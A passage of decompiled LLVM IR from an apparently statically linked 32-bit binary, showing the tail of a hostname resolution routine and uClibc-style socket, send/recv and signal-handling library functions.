  br i1 %v1_8052e1f, label %dec_label_pc_80530d2, label %dec_label_pc_8052e25

dec_label_pc_8052e25:                             ; preds = %dec_label_pc_8052e1c, %dec_label_pc_8052e10, %dec_label_pc_8052e05
  %v0_8052e25 = load i32, i32* @ebp, align 4
  store i32 %v0_8052e25, i32* %eax.global-to-local, align 4
  %v0_8052e27 = load i32, i32* @edi, align 4
  %v1_8052e27 = load i32, i32* @esi, align 4
  %v2_8052e27 = inttoptr i32 %v1_8052e27 to i32*
  store i32 %v0_8052e27, i32* %v2_8052e27, align 4
  %v0_8052e29 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052e29 = sub i32 0, %v0_8052e29
  %v1_8052e2b = urem i32 %v1_8052e29, 4
  %v2_8052e2b = icmp eq i32 %v1_8052e2b, 0
  store i32 %v1_8052e2b, i32* %eax.global-to-local, align 4
  %v0_8052e40.pre = load i32, i32* @ebx, align 4
  br i1 %v2_8052e2b, label %dec_label_pc_8052e3c, label %dec_label_pc_8052e30

dec_label_pc_8052e30:                             ; preds = %dec_label_pc_8052e25
  %v2_8052e30 = sub i32 %v0_8052e40.pre, %v1_8052e2b
  %v7_8052e30 = icmp ult i32 %v0_8052e40.pre, %v1_8052e2b
  br i1 %v7_8052e30, label %dec_label_pc_80530cd, label %dec_label_pc_8052e38

dec_label_pc_8052e38:                             ; preds = %dec_label_pc_8052e30
  %v0_8052e38 = load i32, i32* @ebp, align 4
  %v2_8052e38 = add i32 %v0_8052e38, %v1_8052e2b
  store i32 %v2_8052e38, i32* @ebp, align 4
  store i32 %v2_8052e30, i32* @ebx, align 4
  br label %dec_label_pc_8052e3c

dec_label_pc_8052e3c:                             ; preds = %dec_label_pc_8052e25, %dec_label_pc_8052e38
  %v0_8052e40 = phi i32 [ %v2_8052e30, %dec_label_pc_8052e38 ], [ %v0_8052e40.pre, %dec_label_pc_8052e25 ]
  store i32 %arg6, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %v1_8052e09, align 4
  %tmp43 = icmp ult i32 %v0_8052e40, 4
  br i1 %tmp43, label %dec_label_pc_80530cd, label %dec_label_pc_8052e4f

dec_label_pc_8052e4f:                             ; preds = %dec_label_pc_8052e3c
  %v0_8052e4f = load i32, i32* @ebx, align 4
  %v1_8052e4f = add i32 %v0_8052e4f, -4
  store i32 %v1_8052e4f, i32* %eax.global-to-local, align 4
  %tmp44 = icmp ult i32 %v1_8052e4f, 8
  br i1 %tmp44, label %dec_label_pc_80530cd, label %dec_label_pc_8052e5b

dec_label_pc_8052e5b:                             ; preds = %dec_label_pc_8052e4f
  %v0_8052e5b = load i32, i32* @ebp, align 4
  %v1_8052e5b = add i32 %v0_8052e5b, 4
  store i32 %v1_8052e5b, i32* %edx.global-to-local, align 4
  %v1_8052e5e = add i32 %v0_8052e4f, -12
  store i32 %v1_8052e5e, i32* %eax.global-to-local, align 4
  store i32 %v1_8052e5b, i32* %stack_var_-92, align 4
  %v3_8052e67 = inttoptr i32 %v1_8052e5b to i32*
  store i32 %v0_8052e5b, i32* %v3_8052e67, align 4
  %v0_8052e6a = load i32, i32* %edx.global-to-local, align 4
  %v1_8052e6a = add i32 %v0_8052e6a, 4
  %v2_8052e6a = inttoptr i32 %v1_8052e6a to i32*
  store i32 0, i32* %v2_8052e6a, align 4
  %tmp45 = icmp ult i32 %v1_8052e5e, 32
  br i1 %tmp45, label %dec_label_pc_80530cd, label %dec_label_pc_8052e77

dec_label_pc_8052e77:                             ; preds = %dec_label_pc_8052e5b
  %v0_8052e77 = load i32, i32* @ebx, align 4
  %v1_8052e77 = add i32 %v0_8052e77, -44
  store i32 %v1_8052e77, i32* @ebx, align 4
  %tmp46 = icmp ult i32 %v1_8052e77, 256
  br i1 %tmp46, label %dec_label_pc_80530cd, label %dec_label_pc_8052e8a

dec_label_pc_8052e8a:                             ; preds = %dec_label_pc_8052e77
  %v0_8052e8a = load i32, i32* @ebp, align 4
  %v1_8052e8a = add i32 %v0_8052e8a, 12
  %v1_8052e8d = add i32 %v0_8052e8a, 44
  store i32 %v1_8052e8d, i32* @edi, align 4
  store i32 %v1_8052e8d, i32* %stack_var_-108, align 4
  %v3_8052e9e = inttoptr i32 %v1_8052e8d to i8*
  %v4_8052e9e = call i32 @strncpy(i8* %v3_8052e9e, i32 %arg1, i32 %v1_8052e77)
  %v0_8052ea3 = load i32, i32* @edi, align 4
  %v1_8052ea3 = load i32, i32* @ebp, align 4
  %v2_8052ea3 = add i32 %v1_8052ea3, 12
  %v3_8052ea3 = inttoptr i32 %v2_8052ea3 to i32*
  store i32 %v0_8052ea3, i32* %v3_8052ea3, align 4
  %v1_8052eaa = add i32 %v0_8052e8a, 16
  %v2_8052eaa = inttoptr i32 %v1_8052eaa to i32*
  store i32 0, i32* %v2_8052eaa, align 4
  %v2_8052eb1 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_8052eb1, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v0_8052eb3 = load i32, i32* @ebp, align 4
  store i32 %arg1, i32* %stack_var_-108, align 4
  %v2_8052eb8 = inttoptr i32 %arg1 to i8*
  %v3_8052eb8 = call i32 @inet_aton(i8* %v2_8052eb8, i32 %v0_8052eb3)
  store i32 %v3_8052eb8, i32* %eax.global-to-local, align 4
  %v1_8052ec0 = icmp eq i32 %v3_8052eb8, 0
  br i1 %v1_8052ec0, label %dec_label_pc_8052efc, label %dec_label_pc_8052ec4

dec_label_pc_8052ec4:                             ; preds = %dec_label_pc_8052e8a
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  %v0_8052ec8 = load i32, i32* @edi, align 4
  store i32 %v0_8052ec8, i32* %arg2, align 4
  %v1_8052eca = add i32 %tmp18, 8
  %v2_8052eca = inttoptr i32 %v1_8052eca to i32*
  store i32 2, i32* %v2_8052eca, align 4
  %v0_8052ed1 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052ed1 = add i32 %v0_8052ed1, 12
  %v2_8052ed1 = inttoptr i32 %v1_8052ed1 to i32*
  store i32 4, i32* %v2_8052ed1, align 4
  %v2_8052ed8 = load i32, i32* %stack_var_-92, align 4
  %v1_8052edb = load i32, i32* %edx.global-to-local, align 4
  %v2_8052edb = add i32 %v1_8052edb, 16
  %v3_8052edb = inttoptr i32 %v2_8052edb to i32*
  store i32 %v2_8052ed8, i32* %v3_8052edb, align 4
  %v1_8052ee2 = load i32, i32* %edx.global-to-local, align 4
  %v2_8052ee2 = add i32 %v1_8052ee2, 4
  %v3_8052ee2 = inttoptr i32 %v2_8052ee2 to i32*
  store i32 %v1_8052e8a, i32* %v3_8052ee2, align 4
  store i32 %arg5, i32* @ecx, align 4
  %v0_8052ee9 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8052ee9, i32* %v1_8052dbb, align 4
  store i32 0, i32* %v1_8052e09, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80530d2

dec_label_pc_8052efc:                             ; preds = %dec_label_pc_8052e8a
  %v0_8052efc = call i32 @__open_nameservers()
  store i32 %v0_8052efc, i32* @eax, align 4
  %v2_8052f0c = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_8052f0c, i32* @ebx, align 4
  store i32 %v2_8052f0c, i32* %stack_var_-108, align 4
  %v2_8052f11 = call i32 @__pthread_return_void(i32 %v2_8052f0c, i32 134564459)
  store i32 %v2_8052f11, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805d448.518 to i32), i32* %stack_var_-108, align 4
  %v1_8052f1d = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805d448.518 to i32))
  store i32 ptrtoint (i32* @global_var_805d448.518 to i32), i32* @ecx, align 4
  store i32 134564459, i32* @eax, align 4
  store i32 %v2_8052f0c, i32* %stack_var_-108, align 4
  %v0_8052f27 = load i32, i32* @global_var_8063b34.519, align 4
  store i32 %v0_8052f27, i32* @esi, align 4
  %v2_8052f2d = call i32 @__pthread_return_void(i32 %v2_8052f0c, i32 1)
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_8052f48 = ptrtoint i32* %stack_var_-76 to i32
  %v2_8052f4d = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8052f4d, i32* %eax.global-to-local, align 4
  store i32 %v2_8052f4d, i32* %stack_var_-108, align 4
  %v0_8052f57 = load i32, i32* @esi, align 4
  %v7_8052f5e = call i32 @__dns_lookup(i8* %v2_8052eb8, i32 1, i32 %v0_8052f57, i32 ptrtoint (i32* @global_var_8063b28.520 to i32), i32 %v2_8052f4d, i32 %v2_8052f48)
  store i32 %v7_8052f5e, i32* %eax.global-to-local, align 4
  %v2_8052f66 = icmp slt i32 %v7_8052f5e, 0
  %v1_8052f68 = icmp eq i1 %v2_8052f66, false
  br i1 %v1_8052f68, label %dec_label_pc_8052f7e, label %dec_label_pc_8052f6a

dec_label_pc_8052f6a:                             ; preds = %dec_label_pc_8052efc
  store i32 %arg6, i32* @ecx, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  store i32 1, i32* %v1_8052e09, align 4
  br label %dec_label_pc_80530d2

dec_label_pc_8052f7e:                             ; preds = %dec_label_pc_8052efc
  %v4_8052f7e = trunc i64 %tmp11 to i32
  store i32 %v4_8052f7e, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v10_8052f91 = icmp ugt i32 %v1_8052e77, 256
  %v15_8052f91 = icmp eq i32 %v0_8052e77, 300
  %v2_8052f95 = or i1 %v15_8052f91, %v10_8052f91
  br i1 %v2_8052f95, label %dec_label_pc_8053030, label %dec_label_pc_8052f97

dec_label_pc_8052f97:                             ; preds = %dec_label_pc_8052f7e
  %v3_8052f9a = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_8052f9a, i32* %stack_var_-108, align 4
  %v1_8052f9e = call i32 @free(i32 %v3_8052f9a)
  store i32 %v1_8052f9e, i32* %eax.global-to-local, align 4
  store i32 %v3_8052f9a, i32* @edi, align 4
  %v3_8052fa4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_8052fa4, i32* %stack_var_-108, align 4
  %v1_8052fa8 = call i32 @free(i32 %v3_8052fa4)
  store i32 -1, i32* %v1_8052e09, align 4
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80530a8

dec_label_pc_8053030:                             ; preds = %dec_label_pc_8052f7e
  %v3_8053035.pre = load i32, i32* %stack_var_-76, align 4
  %v0_8053039.pre = load i32, i32* @edi, align 4
  store i32 %v0_8053039.pre, i32* %stack_var_-108, align 4
  %v3_805303a = inttoptr i32 %v0_8053039.pre to i8*
  %v4_805303a = call i32 @strncpy(i8* %v3_805303a, i32 %v3_8053035.pre, i32 %v1_8052e77)
  store i32 %v4_805303a, i32* %eax.global-to-local, align 4
  store i32 %v0_8053039.pre, i32* @ecx, align 4
  %v3_8053040 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_8053040, i32* %stack_var_-108, align 4
  %v1_8053044 = call i32 @free(i32 %v3_8053040)
  store i32 %v1_8053044, i32* %eax.global-to-local, align 4
  %v12_805304c = icmp eq i32 %tmp10, 1
  %v1_8053051 = icmp eq i1 %v12_805304c, false
  br i1 %v1_8053051, label %dec_label_pc_80530ad, label %dec_label_pc_8053053

dec_label_pc_8053053:                             ; preds = %dec_label_pc_8053030
  %v0_8053053 = load i32, i32* @edx, align 4
  %v0_805305a = load i32, i32* @ebp, align 4
  store i32 %v0_805305a, i32* %stack_var_-108, align 4
  %v3_805305b = inttoptr i32 %tmp to i16*
  %v4_805305b = call i32 @memcpy(i16* %v3_805305b, i32 4, i32 %v0_8053053)
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  %v0_8053064 = load i32, i32* @edi, align 4
  store i32 %v0_8053064, i32* %arg2, align 4
  %v1_8053066 = add i32 %tmp18, 8
  %v2_8053066 = inttoptr i32 %v1_8053066 to i32*
  store i32 2, i32* %v2_8053066, align 4
  %v0_805306d = load i32, i32* %eax.global-to-local, align 4
  %v1_805306d = add i32 %v0_805306d, 12
  %v2_805306d = inttoptr i32 %v1_805306d to i32*
  store i32 4, i32* %v2_805306d, align 4
  %v3_8053074 = load i32, i32* %stack_var_-92, align 4
  store i32 %v3_8053074, i32* %edx.global-to-local, align 4
  %v1_8053078 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053078 = add i32 %v1_8053078, 16
  %v3_8053078 = inttoptr i32 %v2_8053078 to i32*
  store i32 %v3_8053074, i32* %v3_8053078, align 4
  %v1_805307f = load i32, i32* %eax.global-to-local, align 4
  %v2_805307f = add i32 %v1_805307f, 4
  %v3_805307f = inttoptr i32 %v2_805307f to i32*
  store i32 %v1_8052e8a, i32* %v3_805307f, align 4
  %v2_8053082 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_8053082, i32* %eax.global-to-local, align 4
  %v3_8053083 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_8053083, i32* %stack_var_-108, align 4
  %v1_8053087 = call i32 @free(i32 %v3_8053083)
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  store i32 %tmp18, i32* %v1_8052dbb, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %arg6, i32* @ecx, align 4
  store i32 0, i32* %v1_8052e09, align 4
  br label %dec_label_pc_80530a8

dec_label_pc_80530a8:                             ; preds = %dec_label_pc_80530ad, %dec_label_pc_8052f97, %dec_label_pc_8053053
  br label %dec_label_pc_80530d2

dec_label_pc_80530ad:                             ; preds = %dec_label_pc_8053030
  %v3_80530b0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_80530b0, i32* %stack_var_-108, align 4
  %v1_80530b4 = call i32 @free(i32 %v3_80530b0)
  store i32 1, i32* %v1_8052e09, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80530a8

dec_label_pc_80530cd:                             ; preds = %dec_label_pc_8052e77, %dec_label_pc_8052e5b, %dec_label_pc_8052e4f, %dec_label_pc_8052e3c, %dec_label_pc_8052e30
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80530d2

dec_label_pc_80530d2:                             ; preds = %dec_label_pc_8052e1c, %dec_label_pc_8052e15, %dec_label_pc_8052dd1, %entry, %dec_label_pc_80530a8, %dec_label_pc_8052f6a, %dec_label_pc_8052ec4, %dec_label_pc_80530cd
  store i32 %v0_8052dab, i32* @ebx, align 4
  store i32 %v0_8052daa, i32* @esi, align 4
  store i32 %v0_8052da9, i32* @edi, align 4
  store i32 %v0_8052da8, i32* @ebp, align 4
  %v0_80530d9 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_80530d9

; uselistorder directives
  uselistorder i32 %v2_8052f0c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_8052e8d, { 1, 0, 2 }
  uselistorder i32 %v1_8052e8a, { 1, 0 }
  uselistorder i32 %v1_8052e77, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_8052e40.pre, { 0, 2, 1 }
  uselistorder i32 %v1_8052e2b, { 4, 2, 3, 1, 0 }
  uselistorder i32 %v2_8052e09, { 2, 0, 1, 3 }
  uselistorder i32* %v1_8052e09, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32* %v1_8052dbb, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 0, 2, 3 }
  uselistorder i32 %tmp18, { 6, 5, 0, 4, 1, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 28, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29 }
  uselistorder i32 %arg6, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg5, { 2, 0, 1 }
  uselistorder i32 %arg1, { 5, 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_80530d2, { 7, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_80530a8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052e3c, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_80530f7 = ptrtoint i32* %stack_var_-12 to i32
  %v2_80530fe = call i32 @__socketcall(i32 3, i32 %v2_80530f7)
  ret i32 %v2_80530fe

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8053123 = ptrtoint i32* %stack_var_-12 to i32
  %v2_805312a = call i32 @__socketcall(i32 6, i32 %v2_8053123)
  ret i32 %v2_805312a

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_805315f = ptrtoint i32* %stack_var_-20 to i32
  %v2_8053166 = call i32 @__socketcall(i32 15, i32 %v2_805315f)
  ret i32 %v2_8053166

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_8053193 = ptrtoint i32* %stack_var_-16 to i32
  %v2_805319a = call i32 @__socketcall(i32 10, i32 %v2_8053193)
  ret i32 %v2_805319a

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_80531c7 = ptrtoint i32* %stack_var_-16 to i32
  %v2_80531ce = call i32 @__socketcall(i32 9, i32 %v2_80531c7)
  ret i32 %v2_80531ce

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_805320b = ptrtoint i32* %stack_var_-24 to i32
  %v2_8053212 = call i32 @__socketcall(i32 11, i32 %v2_805320b)
  ret i32 %v2_8053212

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_8053247 = ptrtoint i32* %stack_var_-20 to i32
  %v2_805324e = call i32 @__socketcall(i32 14, i32 %v2_8053247)
  ret i32 %v2_805324e

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8053273 = ptrtoint i32* %stack_var_-12 to i32
  %v2_805327a = call i32 @__socketcall(i32 1, i32 %v2_8053273)
  ret i32 %v2_805327a

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @__socketcall, { 2, 6, 5, 0, 1, 4, 7, 3 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_805329c, label %dec_label_pc_805328f

dec_label_pc_805328f:                             ; preds = %entry
  %v1_805328f = add i32 %arg1, -64
  %v3_805328f = sub i32 63, %arg1
  %v4_805328f = and i32 %v3_805328f, %arg1
  %v5_805328f = icmp slt i32 %v4_805328f, 0
  %v6_805328f = icmp eq i32 %v1_805328f, 0
  %v7_805328f = icmp slt i32 %v1_805328f, 0
  %v3_8053292 = icmp eq i1 %v7_805328f, %v5_805328f
  %v4_8053292 = icmp eq i1 %v6_805328f, false
  %v5_8053292 = and i1 %v4_8053292, %v3_8053292
  br i1 %v5_8053292, label %dec_label_pc_805329c, label %dec_label_pc_8053294

dec_label_pc_8053294:                             ; preds = %dec_label_pc_805328f
  %v4_8053297 = call i32 @__sigaddset(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_805329c

dec_label_pc_805329c:                             ; preds = %dec_label_pc_805328f, %entry, %dec_label_pc_8053294
  %v1_805329c = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_80532a1 = inttoptr i32 %v1_805329c to i32*
  store i32 22, i32* %v1_80532a1, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_805328f, { 1, 0 }
  uselistorder i32 -64, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_805329c, { 2, 0, 1 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  %v3_80532be = inttoptr i32 %arg1 to i8*
  %v4_80532be = call i32 @__GI_memset(i8* %v3_80532be, i32 0, i32 128)
  ret i32 0
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_80532cc = load i32, i32* @ebx, align 4
  %v15_80532cd = ptrtoint i32* %stack_var_-300 to i32
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v10_80532e1 = icmp eq i32 %arg2, -1
  br i1 %v10_80532e1, label %dec_label_pc_80532ef, label %dec_label_pc_80532e6

dec_label_pc_80532e6:                             ; preds = %entry
  %tmp16 = icmp slt i32 %arg1, 1
  br i1 %tmp16, label %dec_label_pc_80532ef, label %dec_label_pc_80532ea

dec_label_pc_80532ea:                             ; preds = %dec_label_pc_80532e6
  %v7_80532ed = icmp sgt i32 %arg1, 64
  br i1 %v7_80532ed, label %dec_label_pc_80532ef, label %dec_label_pc_80532fc

dec_label_pc_80532ef:                             ; preds = %dec_label_pc_80532ea, %dec_label_pc_80532e6, %entry
  %v1_80532ef = call i32 @__errno_location(i32 %v0_80532cc)
  store i32 %v1_80532ef, i32* %eax.global-to-local, align 4
  %v1_80532f4 = inttoptr i32 %v1_80532ef to i32*
  store i32 22, i32* %v1_80532f4, align 4
  br label %dec_label_pc_8053370

dec_label_pc_80532fc:                             ; preds = %dec_label_pc_80532ea
  store i32 %arg2, i32* %stack_var_-144, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805330a

dec_label_pc_805330a:                             ; preds = %dec_label_pc_805330a.dec_label_pc_805330a_crit_edge, %dec_label_pc_80532fc
  %v0_805330a = phi i32 [ %v15_80532cd, %dec_label_pc_80532fc ], [ %v0_805330a.pre, %dec_label_pc_805330a.dec_label_pc_805330a_crit_edge ]
  %v1_805331517 = phi i32 [ 31, %dec_label_pc_80532fc ], [ %v1_8053315, %dec_label_pc_805330a.dec_label_pc_805330a_crit_edge ]
  %v2_805330a = mul i32 %v1_805331517, 4
  %v3_805330a = add i32 %v2_805330a, 160
  %v4_805330a = add i32 %v3_805330a, %v0_805330a
  %v5_805330a = inttoptr i32 %v4_805330a to i32*
  store i32 0, i32* %v5_805330a, align 4
  %v0_8053315.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8053315 = add i32 %v0_8053315.pre, -1
  %v9_8053315 = icmp slt i32 %v1_8053315, 0
  store i32 %v1_8053315, i32* %eax.global-to-local, align 4
  %v1_8053316 = icmp eq i1 %v9_8053315, false
  br i1 %v1_8053316, label %dec_label_pc_805330a.dec_label_pc_805330a_crit_edge, label %dec_label_pc_8053318

dec_label_pc_805330a.dec_label_pc_805330a_crit_edge: ; preds = %dec_label_pc_805330a
  %v0_805330a.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805330a

dec_label_pc_8053318:                             ; preds = %dec_label_pc_805330a
  %v0_8053318 = load i32, i32* @edx, align 4
  %v2_805331b = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_805331b, i32* %eax.global-to-local, align 4
  %v4_8053323 = call i32 @__sigaddset(i32 %v2_805331b, i32 %arg1, i32 %v0_8053318, i32 %v0_8053318)
  store i32 %v4_8053323, i32* %eax.global-to-local, align 4
  %v2_805332b = icmp slt i32 %v4_8053323, 0
  br i1 %v2_805332b, label %dec_label_pc_8053370, label %dec_label_pc_805332f

dec_label_pc_805332f:                             ; preds = %dec_label_pc_8053318
  %v4_8053337 = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_8063720.521 to i32), i32 %arg1, i32 %v4_8053323, i32 %v4_8053323)
  %v2_8053350 = ptrtoint i32* %stack_var_-284 to i32
  %v2_8053355 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8053355, i32* %eax.global-to-local, align 4
  %v4_805335e = call i32 @__libc_sigaction(i32 %arg1, i32* nonnull %stack_var_-144, i32 %v2_8053350)
  store i32 %v4_805335e, i32* %eax.global-to-local, align 4
  %v2_8053366 = icmp slt i32 %v4_805335e, 0
  br i1 %v2_8053366, label %dec_label_pc_8053370, label %dec_label_pc_805336a

dec_label_pc_805336a:                             ; preds = %dec_label_pc_805332f
  %v3_805336a = load i32, i32* %stack_var_-284, align 4
  br label %dec_label_pc_8053373

dec_label_pc_8053370:                             ; preds = %dec_label_pc_805332f, %dec_label_pc_8053318, %dec_label_pc_80532ef
  br label %dec_label_pc_8053373

dec_label_pc_8053373:                             ; preds = %dec_label_pc_805336a, %dec_label_pc_8053370
  %storemerge = phi i32 [ -1, %dec_label_pc_8053370 ], [ %v3_805336a, %dec_label_pc_805336a ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_80532cc, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8053315, { 2, 1, 0 }
  uselistorder i32* %stack_var_-144, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 9, 6, 7 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 1, 4, 0, 5 }
  uselistorder label %dec_label_pc_8053373, { 1, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_805338a = add i32 %arg2, -1
  %v1_805338d = urem i32 %v1_805338a, 32
  %v2_805338d = icmp eq i32 %v1_805338d, 0
  %v2_8053390 = udiv i32 %v1_805338a, 32
  br i1 %v2_805338d, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_8053393 = shl i32 1, %v1_805338d
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_8053395 = phi i32 [ 1, %entry ], [ %v5_8053393, %bb ]
  %v2_8053395 = mul nuw nsw i32 %v2_8053390, 4
  %v3_8053395 = add i32 %v2_8053395, %arg1
  %v4_8053395 = inttoptr i32 %v3_8053395 to i32*
  %v5_8053395 = load i32, i32* %v4_8053395, align 4
  %v7_8053395 = and i32 %v5_8053395, %v6_8053395
  %v8_8053395 = icmp eq i32 %v7_8053395, 0
  %v1_8053399 = icmp eq i1 %v8_8053395, false
  %v2_8053399 = zext i1 %v1_8053399 to i32
  ret i32 %v2_8053399

; uselistorder directives
  uselistorder i32 %v1_805338d, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__sigaddset(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_80533a0 = load i32, i32* @ebx, align 4
  store i32 %v0_80533a0, i32* %stack_var_-4, align 4
  %v1_80533ae = add i32 %arg2, -1
  %v1_80533b1 = urem i32 %v1_80533ae, 32
  %v2_80533b1 = icmp eq i32 %v1_80533b1, 0
  store i32 %v1_80533b1, i32* @ecx, align 4
  %v2_80533b4 = udiv i32 %v1_80533ae, 32
  store i32 %v2_80533b4, i32* @edx, align 4
  br i1 %v2_80533b1, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_80533b7 = shl i32 1, %v1_80533b1
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_80533b9 = phi i32 [ 1, %entry ], [ %v5_80533b7, %bb ]
  %v2_80533b9 = mul nuw nsw i32 %v2_80533b4, 4
  %v3_80533b9 = add i32 %v2_80533b9, %arg1
  %v4_80533b9 = inttoptr i32 %v3_80533b9 to i32*
  %v5_80533b9 = load i32, i32* %v4_80533b9, align 4
  %v7_80533b9 = or i32 %v5_80533b9, %v6_80533b9
  store i32 %v7_80533b9, i32* %v4_80533b9, align 4
  %v2_80533be = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80533be, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_80533b4, { 1, 0 }
  uselistorder i32 %v1_80533b1, { 2, 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

